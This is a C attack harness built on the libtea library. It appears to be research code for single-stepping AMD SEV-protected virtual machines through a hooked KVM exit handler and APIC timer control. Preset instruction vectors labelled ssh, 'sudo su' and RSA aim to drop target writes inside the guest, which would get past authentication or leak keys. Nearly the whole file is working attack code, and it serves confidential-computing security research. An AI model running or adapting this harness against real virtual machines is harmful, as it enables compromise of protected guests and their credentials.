#include "../libtea.h"
#include <inttypes.h>

#define ASSIST_CORE 1
#define ISOLATED_CPU_CORE 7 
#define KERNEL_SYNC_PA 0x1FEE01000

uint64_t flag, additional_flag = 0;
void *sev_step_kernel_sync_addr_p;

void pin_to_core(int core) { cpu_set_t cpuset; pthread_t thread;

	thread = pthread_self();

	CPU_ZERO(&cpuset); 
	CPU_SET(core, &cpuset);

	pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset); 
}

void* ctrl_thread(void* dummy) { 
	
	pin_to_core(ASSIST_CORE);

	// hook kvm_exit_handler in the kernel 
	asm volatile ("movq %1, (%0)\n"::"r"(sev_step_kernel_sync_addr_p),"r"(flag):);

	/* Wait until the attack finishes */
	while (*(uint32_t*)(sev_step_kernel_sync_addr_p)) {sched_yield();}
}


int main(int argc, char **argv){

	if (argc < 5) { 
	    printf("Usage: <apic_interval> <non_zero_steps> <filter_set_index> <stop>\n"); 
	    exit(0); 
	}

	/* parse */
	int interval = atoi(argv[1]); 
	uint64_t num_non_zeros = atoi(argv[2]); 
	uint64_t set_idx = strtol(argv[3], NULL, 0);
	int stop = atoi(argv[4]);
	//uint64_t start_page = strtol(argv[5], NULL, 0);

	/* libtea init */
	libtea_instance* instance = libtea_init(); 
	if(!instance){
	    libtea_info("Libtea test init failed."); 
	    return 1; 
	}
	libtea_pin_to_core(getpid(), ISOLATED_CPU_CORE);
	libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x03);

  /* REMAP A RANGE OF MEMORY TO SYNC WITH EXIT HANDLER IN KERNEL*/
  sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, 4096, PROT_READ | PROT_WRITE, true);
  memset(sev_step_kernel_sync_addr_p, 0, 4096);
  if (stop)
  	exit(0);

#define DEC        0 
#define UC_VMSA    1
#define INVD       1 
#define NO_STEP    0 

#ifdef  RSA
#define VEC_SEQ    0 
#else
#define VEC_SEQ    1 
#endif

#define START_PAGE    0
#define PAGE_VERBOSE  0 
#define INSTR_VERBOSE 0
  // vec[0]: num of seq
  // count: after the seq, the ith instruction is our target

  uint16_t count;
#ifdef BENCH
  /* Bench */
  uint16_t vec[100] = {12, 0,0,1,0x80,0x40,0x10,0x8,4,4,8,0x10,0x40,0x80,1,0};
#endif
#ifdef SSH
  /* ssh */
  uint16_t vec[100] = {13, 2, 0,0,0,0,0, 4, 0,0,0,0,0, 32,0,32};
  count = 3;

  /* 2nd instr before target */
  asm volatile ("movw $0, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2050));
  /* 1st reg change before the dropping target (`ret`?)*/
  asm volatile ("movw $32, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2054));
#endif
#ifdef SUDO
  /* sudo su */

  // syscall prolog
  //uint16_t vec[100] = {21, 0,0,0,1,1, 1,1,1,1,1, 1,1,1,1,1, 1,1,1,1,1, 1,1,1,1,1, 0x10,0x8,0x40,0x40,0, 0x80,0x10,2,0x100,0x100, 0,0x200,0x20,0x20,0x20, 0,1};
  //count = 247;
  /* NOTE: drop the 2nd target write */

  // syscall epilog
  uint16_t vec[100] = {44, 0,8,0x80,0,0, 8,8,0,0,0, 0,0x80,0,0,0 ,0,0,0,0,0x201, 1,0x101,0x101,3,0x11, 1,1,0x41,0x41,0x5, 1,0x11,0x21,0x20,1, 1,1,1,0,1, 0x21,1,0,0x3000};
  count = 2;

  /* 2nd instr (syscall?) before target */
  asm volatile ("movw $0x3000, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2050));
  /* 1st reg change before the dropping target (`ret`?)*/
  asm volatile ("movw $1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2054));
#endif
#ifdef RSA
  uint16_t vec[100] = {0};
#endif

  /* drop the `i`th target write */
  asm volatile ("movw $1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2052));

// num_non_zeros: Number of non-zero steps we want to perform
// interval: APIC interval writing to TMICT at the end of NPF handler 
// DEC: Flag of whether need to decrypt VMSA (Only debug, now we dont boot VM with -allow-debug)
// UC_VMSA: Mark VMSA into uncacheable
// INVD: Invalidate cache after VM breaks (when we find the target)
// NO_STEP: Do not care the stepping is zero step or not (i.e., do not observe VMSA)
// 0x77: Hook Switch
// PAGE_VERBOSE: Guest physical addr of each NPF
// INSTR_VERBOSE: Reg Usage of each non-zero-step
  flag = (num_non_zeros << 32) + (interval << 16) + (DEC << 8) + (UC_VMSA << 9) + (INVD << 10) + (NO_STEP << 11) + (VEC_SEQ << 12) + (START_PAGE << 13) + (PAGE_VERBOSE << 14) + (INSTR_VERBOSE << 15) + 0x77;

  for (int i = 0; i <= vec[0]; i++)
      asm volatile ("movw %1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+16+2*i),"r"(vec[i]):);


  /* Write the target set (will not start the hook in exit_handler) */
  asm volatile ("movq %1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+8),"r"(set_idx):);

  //asm volatile ("movq %1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+1024),"r"(start_page):);
  asm volatile ("movw %1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+2048),"r"(count):);


#define WBNOINVD 0
#define WBINVD   1

/* Timing the context switch */
#define RUNTIME    0
#define ZS_TLB_FLUSH 1 

  additional_flag = WBNOINVD + (RUNTIME << 2) + (ZS_TLB_FLUSH << 3);
  asm volatile ("movq %1, (%0)\n"::"r"(sev_step_kernel_sync_addr_p+3096),"r"(additional_flag):);

  pthread_t p;
  pthread_create(&p, NULL, ctrl_thread, NULL);
  sched_yield();

  /* Setting APIC_TDR_DIV_2
   * AMD use oneshot mode by default
   * 0xec is the default idx
   * */
  //libtea_apic_timer_oneshot(instance, 0xec);
  libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x0);

  pthread_join(p, NULL);

  /* RESUME APIC REGISTERS */
  libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x03);
  libtea_apic_set_timer_unsafe(0x6000); // 
  libtea_apic_lvtt = libtea_apic_tdcr = 0; 

libtea_test_interrupts_cleanup:
  libtea_cleanup(instance);

  return 0;
}

